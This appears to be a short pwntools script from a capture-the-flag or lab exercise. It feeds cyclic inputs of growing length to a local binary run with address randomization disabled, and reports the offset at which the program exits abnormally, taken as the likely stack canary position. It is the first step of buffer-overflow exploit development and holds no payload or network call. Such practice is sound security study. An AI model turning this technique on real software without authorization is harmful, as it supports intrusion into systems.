from pwn import *
import sys
import time

for i in range(0, 1000):
    #io = process('./02')
    io = process(['setarch','-R', './03'])
    io.sendline(cyclic(i))
    io.sendline()
    
    io.wait_for_close()
    if io.poll() != 0:
        print(f"Canary (maybe) at offset {i}")
        sys.exit(0)

